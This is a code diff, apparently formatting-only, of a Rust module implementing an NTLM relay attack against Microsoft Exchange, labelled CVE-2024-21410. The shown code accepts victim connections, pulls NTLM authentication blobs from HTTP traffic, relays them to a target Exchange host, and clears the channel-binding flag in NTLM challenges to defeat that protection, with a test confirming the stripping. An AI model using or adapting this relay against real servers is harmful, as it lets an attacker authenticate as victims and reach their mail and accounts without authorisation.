@@ -93,15 +93,19 @@ impl ExchangeRelay {
         let listener = TcpListener::bind(&listen_addr)
             .await
             .map_err(|e| RelayError::Network(format!("Bind failed: {e}")))?;
-        info!("Exchange relay listening on {listen_addr} → {}:{} (CVE-2024-21410)",
-            self.config.target_host, self.config.target_port);
+        info!(
+            "Exchange relay listening on {listen_addr} → {}:{} (CVE-2024-21410)",
+            self.config.target_host, self.config.target_port
+        );
 
         let running = self.running.clone();
         let config = self.config.clone();
 
         let handle = tokio::spawn(async move {
             loop {
-                if !running.load(Ordering::SeqCst) { break; }
+                if !running.load(Ordering::SeqCst) {
+                    break;
+                }
                 match listener.accept().await {
                     Ok((stream, addr)) => {
                         debug!("Exchange relay: connection from {addr}");
@@ -126,7 +130,9 @@ impl ExchangeRelay {
 
     pub async fn stop(&mut self) {
         self.running.store(false, Ordering::SeqCst);
-        for handle in self.tasks.drain(..) { handle.abort(); }
+        for handle in self.tasks.drain(..) {
+            handle.abort();
+        }
     }
 }
 
@@ -149,7 +155,9 @@ async fn handle_exchange_relay(
     let exchange_addr = format!("{}:{}", config.target_host, config.target_port);
     info!("Connecting to Exchange at {exchange_addr}");
     if config.use_tls {
-        warn!("TLS for Exchange relay is not yet implemented; relaying over plain TCP. Set use_tls=false.");
+        warn!(
+            "TLS for Exchange relay is not yet implemented; relaying over plain TCP. Set use_tls=false."
+        );
     }
     let mut exchange_stream = TcpStream::connect(&exchange_addr)
         .await
@@ -215,9 +223,15 @@ async fn handle_exchange_relay(
     let auth_success = response_str.contains("200 OK") || response_str.contains("202 Accepted");
 
     if auth_success {
-        info!("Exchange relay succeeded — authenticated to {}", config.target_host);
+        info!(
+            "Exchange relay succeeded — authenticated to {}",
+            config.target_host
+        );
     } else {
-        warn!("Exchange relay failed — auth rejected by {}", config.target_host);
+        warn!(
+            "Exchange relay failed — auth rejected by {}",
+            config.target_host
+        );
     }
 
     victim_stream
@@ -239,7 +253,8 @@ fn build_exchange_http_request(path: &str, ntlm_blob: &[u8]) -> Vec<u8> {
          Connection: keep-alive\r\n\
          \r\n",
         path, b64
-    ).into_bytes()
+    )
+    .into_bytes()
 }
 
 fn extract_ntlm_from_http(body: &str) -> Option<Vec<u8>> {
@@ -248,14 +263,18 @@ fn extract_ntlm_from_http(body: &str) -> Option<Vec<u8>> {
             || line.to_uppercase().contains("AUTHORIZATION: NTLM ")
         {
             if let Some(b64_part) = line.split("NTLM ").nth(1) {
-                return base64::engine::general_purpose::STANDARD.decode(b64_part.trim()).ok();
+                return base64::engine::general_purpose::STANDARD
+                    .decode(b64_part.trim())
+                    .ok();
             }
         }
     }
     if let Some(b64_start) = body.find("NTLM ") {
         let after = &body[b64_start + 5..];
         if let Some(end) = after.find(|c: char| c == '\r' || c == '\n') {
-            return base64::engine::general_purpose::STANDARD.decode(after[..end].trim()).ok();
+            return base64::engine::general_purpose::STANDARD
+                .decode(after[..end].trim())
+                .ok();
         }
     }
     None
@@ -268,9 +287,7 @@ fn strip_channel_bindings(challenge: &[u8]) -> Vec<u8> {
     const NTLMSSP_NEGOTIATE_CHANNEL_BINDING: u32 = 0x40000000;
     let mut modified = challenge.to_vec();
     if modified.len() >= 24 {
-        let flags = u32::from_le_bytes([
-            modified[20], modified[21], modified[22], modified[23],
-        ]);
+        let flags = u32::from_le_bytes([modified[20], modified[21], modified[22], modified[23]]);
         let new_flags = flags & !NTLMSSP_NEGOTIATE_CHANNEL_BINDING;
         modified[20..24].copy_from_slice(&new_flags.to_le_bytes());
     }
@@ -311,9 +328,7 @@ mod tests {
         let mut challenge = vec![0u8; 32];
         challenge[20..24].copy_from_slice(&0x40000000u32.to_le_bytes());
         let stripped = strip_channel_bindings(&challenge);
-        let flags = u32::from_le_bytes([
-            stripped[20], stripped[21], stripped[22], stripped[23],
-        ]);
+        let flags = u32::from_le_bytes([stripped[20], stripped[21], stripped[22], stripped[23]]);
         assert_eq!(flags & 0x40000000, 0);
     }
 
